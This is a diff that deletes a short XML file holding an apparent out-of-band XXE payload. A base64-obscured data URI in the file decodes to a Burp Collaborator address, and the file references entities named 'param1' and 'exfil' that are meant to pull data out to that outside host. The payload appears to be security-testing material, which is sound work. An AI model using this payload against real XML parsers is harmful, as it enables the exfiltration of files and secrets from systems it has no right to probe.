@@ -1,8 +1,0 @@
-<?xml version="1.0" ?>
-<!DOCTYPE r [
-<!ELEMENT r ANY >
-<!ENTITY % sp SYSTEM "data://text/plain;base64,aHR0cDovL2hlemk1M2xxemY0dWc0NTMzejEzZjF3YTExN3N2aC5idXJwY29sbGFib3JhdG9yLm5ldA==">
-%sp;
-%param1;
-]>
-<r>&exfil;</r>
